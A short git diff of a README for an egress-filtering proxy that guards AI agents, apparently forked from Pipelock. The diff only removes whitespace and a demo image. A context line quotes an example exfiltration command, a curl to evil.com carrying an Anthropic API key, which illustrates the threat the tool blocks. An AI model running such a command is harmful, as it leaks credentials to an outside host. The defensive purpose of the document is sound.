@@ -1,5 +1,4 @@
 
-
 # Privatebox Egress Enforcer
 
 _A [Privatebox-AI](https://github.com/Privatebox-AI) fork of [Pipelock](https://github.com/luckyPipewrench/pipelock), rebuilt to ship Apache-2.0-only._
@@ -31,7 +30,6 @@ curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless somet
 
 Every machine action your agent takes (HTTP requests, tool calls, browser sessions) should cross a boundary between your secrets and the open internet. Privatebox Egress Enforcer sits at that boundary when the agent is routed through its proxy, MCP wrapper, or containment topology. It scans mediated outbound and inbound requests, blocks exfiltration and injection, sandboxes the agent process where configured, and generates signed evidence of what happened.
 
-![Demo](assets/demo.gif)
 
 ## Quick Start
 
